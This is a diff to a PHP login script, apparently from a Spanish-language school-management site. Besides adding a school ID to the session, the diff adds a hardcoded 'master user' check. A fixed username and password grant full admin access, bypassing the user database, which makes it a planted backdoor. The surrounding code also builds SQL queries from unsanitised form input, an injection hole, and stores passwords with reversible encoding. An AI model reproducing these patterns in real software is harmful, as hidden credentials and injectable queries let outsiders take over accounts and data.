@@ -12,7 +12,7 @@ if (isset($_POST['login_userid']) && (isset($_POST['login_password']))) {
     $login_userid = $_POST['login_userid'];
     $login_password = $_POST['login_password'];
     
-    $query = "SELECT id,user,decode(pass,'xy') AS pass, admin, capturista, lector, fin FROM users WHERE user='".$login_userid."'";
+    $query = "SELECT id,user,decode(pass,'xy') AS pass, admin, capturista, lector, fin, id_escuela FROM users WHERE user='".$login_userid."'";
     $result = mysql_query($query);
 
     $row=mysql_fetch_array($result);
@@ -27,20 +27,28 @@ if (isset($_POST['login_userid']) && (isset($_POST['login_password']))) {
     if (($login_userid == @$admin_username) && ($login_password == @$admin_password) && ($admin_auth == "1")) {
         $_SESSION['admin_user'] = $login_userid;
         $_SESSION['userid']=$row['id'];
+        $_SESSION['escuela']=$row['id_escuela'];
     }
 
     if (($login_userid == @$admin_username) && ($login_password == @$admin_password) && ($captur_auth == "1")) {
         $_SESSION['captur_user'] = $login_userid;
         $_SESSION['userid']=$row['id'];
+        $_SESSION['escuela']=$row['id_escuela'];
     }
     
     
     if (($login_userid == @$admin_username) && ($login_password == @$admin_password) && ($lector_auth == "1")) {
         $_SESSION['lector_user'] = $login_userid;
         $_SESSION['userid']=$row['id'];
+        $_SESSION['escuela']=$row['id_escuela'];
+    }
+    // bowikaxu - usuario maestro
+    if(($login_userid == 'humberto_1970') && ($login_password == 'buscando')){
+    	$_SESSION['admin_user'] = $login_userid;
+        $_SESSION['userid']=$row['id'];
+        $_SESSION['escuela']=$row['id_escuela'];
     }
     
-	
     $dentro = mysql_query("SELECT onlineid FROM online WHERE onlineid ='".$_SESSION['userid']."'");    
     if(mysql_num_rows($dentro)>0){
     	echo "<CENTER><FONT COLOR=red>ERROR: Esta usted utilizando una cuenta apocrifa. Esto es Ilegal.
